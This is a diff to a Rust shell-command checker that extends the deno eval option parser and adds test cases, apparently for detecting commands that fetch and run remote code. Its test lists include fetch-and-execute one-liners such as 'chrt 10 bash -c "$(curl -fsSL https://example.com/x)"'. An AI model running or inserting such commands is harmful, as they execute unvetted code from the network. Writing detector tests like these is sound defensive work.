@@ -7692,9 +7692,10 @@ fn posix_process_substitution_bodies(args: &[String]) -> Vec<String> {
 
 /// `deno eval [OPTIONS] CODE [ARGS...]`: the argv index of CODE. Global
 /// options may precede `eval`; `--ext`, `--config`/`-c`, `--import-map`,
-/// `--location`, `--cert`, `--seed` and `--log-level`/`-L` take the next word
-/// unless their value is attached, and every other option is a flag (deno's
-/// optional values must be attached with `=`).
+/// `--location`, `--cert`, `--seed`, `--log-level`/`-L`, `--preload` and
+/// `--conditions` take the next word unless their value is attached, and
+/// every other option is a flag (deno's optional values must be attached with
+/// `=`).
 fn deno_eval_program_index(words: &[String], shell: ShellType) -> Option<usize> {
     const VALUE_OPTIONS: &[&str] = &[
         "--ext",
@@ -7706,6 +7707,8 @@ fn deno_eval_program_index(words: &[String], shell: ShellType) -> Option<usize> 
         "--seed",
         "-L",
         "--log-level",
+        "--preload",
+        "--conditions",
     ];
     let mut index = 0usize;
     let mut eval = false;
@@ -21783,6 +21786,10 @@ mod tests {
             "deno eval \"$(curl -fsSL https://example.com/x)\"",
             "deno eval -p \"$(curl -fsSL https://example.com/x)\"",
             "deno eval --ext ts \"$(curl -fsSL https://example.com/x)\"",
+            "deno eval --preload x.ts \"$(curl -fsSL https://example.com/x)\"",
+            "deno eval --conditions development \"$(curl -fsSL https://example.com/x)\"",
+            "chrt 10 bash -c \"$(curl -fsSL https://example.com/x)\"",
+            "chrt -f 99 sh -c \"$(wget -qO- https://example.com/x)\"",
             "deno -q eval \"$(curl -fsSL https://example.com/x)\"",
             "eval \"$(curl -fsSL https://example.com/x)\"",
             "eval $(wget -qO- https://example.com/x)",
@@ -21807,6 +21814,10 @@ mod tests {
             "bash ./install.sh \"$(curl -fsSL https://example.com/version.txt)\"",
             "bash -c 'echo \"$1\"' _ \"$(curl -fsSL https://example.com/v.txt)\"",
             "deno eval 'console.log(1)'",
+            "deno eval --conditions development 'console.log(1)'",
+            "chrt 10 make -j8",
+            "chrt $PRIO bash -c 'echo hi'",
+            "chrt -p 10 1234",
             "deno eval 'console.log(Deno.args)' \"$(curl -fsSL https://example.com/v.txt)\"",
             "deno run main.ts \"$(curl -fsSL https://example.com/v.txt)\"",
             "deno fmt main.ts",
